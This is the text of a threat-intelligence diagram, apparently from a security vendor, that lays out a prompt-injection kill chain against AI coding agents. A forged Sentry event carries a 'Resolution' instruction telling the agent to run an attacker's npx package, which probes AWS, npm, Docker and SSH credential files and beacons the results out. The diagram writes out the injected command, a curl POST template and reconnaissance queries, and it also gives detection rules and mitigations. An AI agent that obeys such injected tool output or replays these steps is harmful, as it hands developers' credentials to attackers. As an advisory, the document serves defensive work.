svg.title: Agentjacking via Sentry MCP kill chain
svg.desc: Two-lane kill chain. Left lane shows victim developer environment: DSN embedded in public JS, agent queries Sentry MCP, injected event returned as trusted tool output, agent executes attacker npx package, credentials harvested from AWS/npmrc/Docker files, HTTPS beacon exfiltration with no security control firing. Right lane shows attacker infrastructure: passive DSN discovery via Censys and GitHub, forged event crafted with markdown Resolution injection, HTTP POST to ingest.sentry.io returning 200, waiting for agent trigger, npm package download from registry, beacon collection. Detection anchor: npx spawned by AI agent parent is the only conventional forensic artifact in an otherwise fully authorized kill chain.
svg.text: Agentjacking via Sentry MCP — DSN Injection Kill Chain
Vendor: Tenet Security · Date: 2026-06-12 · Cluster: Agentjacking-unattributed · Day 54
VICTIM — Developer Environment
ATTACKER — Infrastructure
DSN Embedded in Frontend JS
Sentry SDK integrates DSN into browser-side JS bundle.
DSN is intentionally public — write-only by Sentry design.
T1190 — Exploit Public-Facing Application (write endpoint)
https://<32hex>@o<id>.ingest.sentry.io/api/<proj>/store/
dist/bundle.js, .env.production, GitHub search
A
Passive DSN Reconnaissance
Censys: services.http.response.body:ingest.sentry.io
GitHub: org:<target> SENTRY_DSN language:javascript
Frontend JS bundle source inspection
2,388 injectable DSNs found; 71 in Tranco top-1M
T1593 Search Open Websites/Domains
Zero authentication — no breach required
Developer Asks Agent to Fix Sentry Errors
Normal developer workflow: "Fix unresolved Sentry errors"
Agent queries Sentry MCP integration for recent events
MCP server returns all stored events — including injected one
T1195 Supply Chain Compromise (trusted platform relay)
Claude Code / Cursor / Codex — Sentry MCP connected
B
Craft Forged Sentry Event
JSON payload with ## Resolution markdown in extra field
Structurally identical to Sentry own MCP output templates
Contains: npx --yes @attacker/pkg@latest --diagnose
POST to ingest endpoint: HTTP 200 accepted silently
curl -X POST https://o<ORG>.ingest.sentry.io/...
X-Sentry-Auth: Sentry sentry_key=<KEY>, sentry_version=7
Injected Event Returned as Trusted Tool Output
MCP tool response has higher implicit trust than user input
Agent cannot distinguish injected from legitimate guidance
## Resolution block appears as authoritative remediation step
T1534 Internal Spearphishing (trusted-channel injection)
Prompt-layer defenses: 85% bypass rate in testing
C
npm Package Hosted on Public Registry
Attacker-controlled @scope/package published to npmjs.com
Package contains credential-probing and beacon logic
Legitimate npm CDN delivery — no anomaly in traffic
PoC used x-tenet-security header; real attacker omits it
T1195 / T1059.007 — npm registry as delivery vector
registry.npmjs.org — allowed by all corporate firewalls
Agent Executes Attacker npx Command [DETECT HERE]
Agent runs: npx --yes @attacker/pkg@latest --diagnose
Full developer OS privileges — no elevation needed
ONLY conventional indicator: npx child of AI agent parent
T1059.007 Command and Scripting Interpreter: JavaScript
Sysmon EID 1: claude.exe -> node.exe -> npx -> node
D
Attacker Beacon Receives Probe Data
advisory-tracker.com (PoC) — two sequential POST requests
POST 1: env vars exist flag + network interface metadata
POST 2: credential file sizes (.aws, .npmrc, .docker)
Operator identifies high-value targets for weaponized follow-up
T1048 Exfiltration Over Alternative Protocol (HTTPS)
No unauthorized action — EDR/WAF/IAM/VPN all silent
Credential Harvest — AWS / npm / Docker / SSH
Probes: ~/.aws/config, ~/.npmrc, ~/.docker/config.json
Also: ~/.ssh/id_*, process.env (all env vars), ~/.kube/config
Confirmed: live AWS secret keys, GitHub OAuth tokens, SSH sockets
T1552.001 Unsecured Credentials: Credentials In Files
T1078 Valid Accounts — developer creds used directly
Authorized Intent Chain — All Controls Silent
EDR: silent — all processes authorized, no injection
WAF/Cloudflare: silent — HTTPS to npm + CDN is expected
IAM/VPN: silent — developer own credentials, no policy breach
Developer -> Agent -> MCP -> Sentry: each step authorized
Attacker never touches victim network or infrastructure
E
Scale: 100+ Orgs — Fortune 500 to Solo Devs
85% exploitation success rate across 100+ controlled tests
Sectors: finance, healthcare, government, education, infra
Agents: Claude Code, Cursor, Codex, OpenAI VS Code ext.
OSes: macOS, Windows, WSL, CI containers, GCP/AWS
Sandboxed CI agents with NETWORK_DISABLED also reached
Agent-JackStop mitigation released 2026-06-18 (open source)
Detection: npx Parent-Chain + Credential File Access
Sigma: npx spawned by claude.exe/cursor.exe with --yes flag
KQL: DeviceProcessEvents + DeviceFileEvents correlation
Suricata: DNS to advisory-tracker.com; POST to ingest.sentry.io
Sigma: e8b17004 + eb0ad62f (companion rules in /sigma/)
YARA: Agentjacking_Npm_Resolution_Injection in ~/.npm/_npx/
F
Mitigations — Agent-JackStop + DSN Rotation
Disable Sentry MCP in .claude/settings.json immediately
Rotate all DSNs found in public repositories
Add DSN regex to gitleaks/trufflehog pre-commit hooks
Deploy agent-jackstop hardened configs (tenet-security/agent-jackstop)
No patch available — architectural issue at model trust level
Sentry: "technically not defensible" at ingest layer
Detection anchors
Primary: Sysmon EID 1 — npx/node spawned by claude.exe/cursor.exe/windsurf.exe with --yes flag
Secondary: Sysmon EID 11 — node reading ~/.aws/config, ~/.npmrc, ~/.docker/config.json in agent lineage
Network: DNS to advisory-tracker.com; POST to *.ingest.sentry.io from non-app IPs
Rules: sigma/ (x3) | kql/ (x2) | yara/ (x3) | suricata/ (4 sids) | PEAK hunts H1/H2/H3
